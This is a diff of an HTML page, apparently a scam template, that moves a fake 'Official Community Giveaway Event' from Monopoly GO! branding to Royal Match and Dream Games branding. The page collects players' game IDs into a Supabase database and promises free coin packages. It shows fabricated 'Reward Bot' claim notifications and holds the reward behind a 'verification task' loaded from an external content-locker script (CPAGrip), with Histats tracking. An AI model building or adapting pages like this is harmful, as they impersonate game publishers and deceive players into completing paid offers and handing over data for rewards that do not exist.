@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Monopoly GO! - Official Community Giveaway Event</title>
+    <title>Royal Match - Official Community Giveaway Event</title>
     <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:400,600,800&display=swap">
-    <link rel="icon" href="./app-logo.png" type="image/x-icon">
+    <link rel="icon" href="./Royal_Match_app_icon.png" type="image/x-icon">
     
     <script src="/config.js"></script>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
@@ -28,7 +28,7 @@
             var script = document.createElement('script');
             script.type = 'text/javascript';
             script.id = 'ogjs';
-            script.src = 'https://verify.zhwifi.web.id/cl/js/xpp2kj'; 
+            script.src = 'https://verify.zhwifi.web.id/cl/js/krrq68'; 
             document.head.appendChild(script);
         } else {
             // MODE OWNER (CPAGrip)
@@ -38,10 +38,10 @@
     </script>
 
     <style>
-        :root { --primary: #f44336; --accent: #ffcc00; --gold: #f1c40f; --bg-dark: #001220; }
+        :root { --primary: #7b66ff; --accent: #ffcc00; --gold: #f1c40f; --bg-dark: #001220; }
         body { margin: 0; font-family: 'Poppins', sans-serif; color: #fff; background: var(--bg-dark); overflow-x: hidden; }
-        .aurora-bg { position: fixed; inset: 0; z-index: -1; background: radial-gradient(circle at 10% 20%, rgba(0, 108, 229, 0.4), transparent 50%), radial-gradient(circle at 90% 80%, rgba(255, 204, 0, 0.2), transparent 50%), linear-gradient(180deg, #ca5d01 0%, #fe410d5b 100%); }
-        .header { width: 100%; height: 70px; background: #f44336; display: flex; align-items: center; justify-content: center; border-bottom: 3px solid var(--accent); position: fixed; top: 0; z-index: 1000; }
+        .aurora-bg { position: fixed; inset: 0; z-index: -1; background: radial-gradient(circle at 10% 20%, rgba(0, 108, 229, 0.4), transparent 50%), radial-gradient(circle at 90% 80%, rgba(255, 204, 0, 0.2), transparent 50%), linear-gradient(180deg, #4d31fb 0%, #1f02d8 100%); }
+        .header { width: 100%; height: 70px; background: #7b66ff; display: flex; align-items: center; justify-content: center; border-bottom: 3px solid var(--accent); position: fixed; top: 0; z-index: 1000; }
         .header-content { display: flex; align-items: center; gap: 15px; }
         .header img { height: 40px; }
         .publisher-separator { width: 1px; height: 25px; background: rgba(255, 255, 255, 0.3); }
@@ -63,7 +63,7 @@
         .winner-item { background: #f1f5f9; padding: 10px; border-radius: 10px; margin-bottom: 8px; font-size: 11px; text-align: left; border-left: 4px solid var(--primary); }
         h1 { color: var(--primary); text-transform: uppercase; font-size: 20px; font-weight: 800; }
         input[type="text"] { width: 85%; padding: 15px; border-radius: 12px; border: 2px solid #ddd; font-size: 18px; text-align: center; margin-bottom: 15px; outline: none; }
-        .btn-main { background: linear-gradient(180deg, #f44336 0%, #d32f2f 100%); color: white; padding: 16px; border-radius: 15px; font-weight: 700; cursor: pointer; border: none; width: 95%; font-size: 18px; text-transform: uppercase; }
+        .btn-main { background: linear-gradient(180deg, #7b66ff 0%, #1b05a1 100%); color: white; padding: 16px; border-radius: 15px; font-weight: 700; cursor: pointer; border: none; width: 95%; font-size: 18px; text-transform: uppercase; }
         .reward-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 20px 0; }
         .reward-item { background: #f1f5f9; border: 2px solid #eee; border-radius: 15px; padding: 12px; cursor: pointer; color: #333; font-weight: bold; }
         .reward-item.active { border-color: var(--primary); background: #fff1f0; transform: scale(1.03); }
@@ -108,9 +108,9 @@
 
 <div class="header">
     <div class="header-content">
-        <img src="./Monopoly_Go.webp" alt="Monopoly GO!">
+        <img src="./Royal-Match-Logo.webp" alt="Royal Match">
         <div class="publisher-separator"></div>
-        <img src="./Scopely_logo.svg.png" class="publisher-logo" alt="Scopely">
+        <img src="./DreamGames_Logo.svg.png" class="publisher-logo" alt="DreamGames">
     </div>
 </div>
 
@@ -120,7 +120,7 @@
             
             <!-- STEP 1 -->
             <div id="step1">
-                <img src="./app-logo.png" class="hero-icon">
+                <img src="./Royal_Match_app_icon.png" class="hero-icon">
                 <h1>Community Giveaway Event</h1>
                 <p style="font-size: 13px; color: #aaa; margin-bottom: 20px;">
                   Join our exclusive weekly event! Enter your valid Game ID to participate in the raffle.<br>
@@ -160,12 +160,12 @@
             <!-- STEP 3: SELECTION -->
             <div id="step-select" style="display:none">
                 <span>Hi <b id="usernamer"></b>, Congratulations 👏🎉</span>
-                <h1>Select Your Dice Package</h1>
+                <h1>Select Your Coins Package</h1>
                 <div class="reward-grid">
-                    <div class="reward-item active" onclick="selectR(this, 1500)"><img src="https://iili.io/JH5jGUl.png">1,500 Dice</div>
-                    <div class="reward-item" onclick="selectR(this, 3200)"><img src="https://iili.io/JH5jGUl.png">3,200 Dice</div>
-                    <div class="reward-item" onclick="selectR(this, 5500)"><img src="https://iili.io/JH5jGUl.png">5,500 Dice</div>
-                    <div class="reward-item" onclick="selectR(this, 8000)"><img src="https://iili.io/JH5jGUl.png">8,000 Dice</div>
+                    <div class="reward-item active" onclick="selectR(this, 1500)"><img src="./7ae3c528-21db-4603-afed-6f86f1954815.png">1,500 Coins</div>
+                    <div class="reward-item" onclick="selectR(this, 3200)"><img src="./7ae3c528-21db-4603-afed-6f86f1954815.png">3,200 Coins</div>
+                    <div class="reward-item" onclick="selectR(this, 5500)"><img src="./7ae3c528-21db-4603-afed-6f86f1954815.png">5,500 Coins</div>
+                    <div class="reward-item" onclick="selectR(this, 8000)"><img src="./7ae3c528-21db-4603-afed-6f86f1954815.png">8,000 Coins</div>
                 </div>
                 <button onclick="confirmReward()" class="btn-main">Claim Selection</button>
             </div>
@@ -177,7 +177,7 @@
                     <p style="color:#333; font-size: 13px; line-height: 1.5;">
                         Player Found: <b id="user-display" style="font-size: 16px; color: #000;"></b> <span style="color:green">✔</span>
                         <br><br>
-                        To officially enter the Giveaway List and claim <b><span id="final-amt"></span> Dice</b>, please complete one verification task below.
+                        To officially enter the Giveaway List and claim <b><span id="final-amt"></span> Coins</b>, please complete one verification task below.
                     </p>
                 </div>
                 <p style="font-size: 11px; color: #666; margin-bottom: 10px;">
@@ -219,7 +219,7 @@
     <img src="https://cdn-icons-png.flaticon.com/128/3558/3558860.png" alt="bot">
     <div class="tg-notif-text">
         <b>Reward Bot</b> <br>
-        <span id="tg-user">User123</span> claimed <span id="tg-reward">8,000 Dice</span>!
+        <span id="tg-user">User123</span> claimed <span id="tg-reward">8,000 Coins</span>!
     </div>
 </div>
 
@@ -227,8 +227,8 @@
     // =========================================
     // 1. CONFIG (Bagian ini BOLEH diedit)
     // =========================================
-    const MY_REWARD_NAME = "Dice"; 
-    const MY_GAME_ID = "MONOPOLY GO!";
+    const MY_REWARD_NAME = "Coins"; 
+    const MY_GAME_ID = "Royal Match";
     const SB_URL = 'https://rtuzlitxkguvyzjfolwz.supabase.co';
     const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJ0dXpsaXR4a2d1dnl6amZvbHd6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjcxNjg4MDMsImV4cCI6MjA4Mjc0NDgwM30.i_bhDn2dOOvEyXd_ruu6scvneVPKoi8m8fh-mEydEQU';
 
@@ -314,7 +314,7 @@
         // Simpan Data di Background
         savePlayerToDB(user_id);
 
-        // Pindah ke step pilih dice
+        // Pindah ke step pilih Coins
         setTimeout(function() {
             $("#step-process").hide();
             $("#step-select").show();
@@ -430,7 +430,7 @@
     _Hasync.push(['Histats.start', '1,' + activeID + ',4,0,0,0,00010000']);
     _Hasync.push(['Histats.fasi', '1']);
     _Hasync.push(['Histats.track_hits', '']);
-    _Hasync.push(['Histats.custom_variable', ['Game', 'MonopolyGO']]); // Hardcoded biar aman
+    _Hasync.push(['Histats.custom_variable', ['Game', 'RoyalMatch']]); // Hardcoded biar aman
     _Hasync.push(['Histats.custom_variable', ['Member', subID]]);
 
     (function() {
